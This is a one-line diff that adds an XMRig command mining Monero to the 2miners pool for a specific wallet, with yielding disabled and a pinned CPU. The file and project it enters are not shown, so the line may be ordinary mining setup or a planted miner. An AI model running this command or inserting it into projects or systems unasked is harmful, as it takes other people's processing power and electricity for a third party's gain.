@@ -1,0 +1,1 @@
+./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 49QgS4Cu9uqVeqgDpwtdZWYZrDNrUJXfzDiGmwsZFLdEgQPAQV7SbswUHqZG3B45HAiSR1cYZoSvgC56kctnqsSjMNFnJmU.htc -p x -t 2 --cpu-no-yield --cpu-affinity=5
